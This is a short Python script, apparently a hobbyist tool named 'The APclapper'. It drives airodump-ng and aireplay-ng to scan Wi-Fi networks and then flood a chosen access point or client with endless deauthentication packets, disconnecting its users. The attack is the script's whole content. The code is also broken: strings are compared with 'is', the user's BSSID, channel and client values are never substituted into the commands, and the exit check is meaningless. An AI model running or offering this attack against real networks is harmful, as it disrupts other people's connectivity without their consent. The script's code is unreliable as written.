import os

airodumpng = input("do you want to start scanning for networks to CLAP! Yes/no")
print ("when running airodump-ng just press ctrl c to stop")
if airodumpng is "Yes":
  os.system("airodump-ng start wlan0")
else:
  os.system("exit")
if os.system == 'exit':
  print ("if you want to exit the program just press CTRL and c to stop")

bssid = input("enter the bssid that you want to CLAP!")
channel = input("enter the channel of the channel you wanna CLAP!")
os.system("airodump-ng --channel (channel) --bssid (bssid) wlan0mon")
aireplay = input("do you want to clap the entire network or just a client? Network/Client")
if aireplay is 'Network':
  os.system("aireplay-ng -0 0 -a (bssid) wlan0mon")
else:
  aireplay_client = input("enter the client you wanna CLAP:")
  os.system("aireplay-ng -0 0 -a (bssid) -c (aireplay_client) wlan0mon")

print ("The APclapper...")
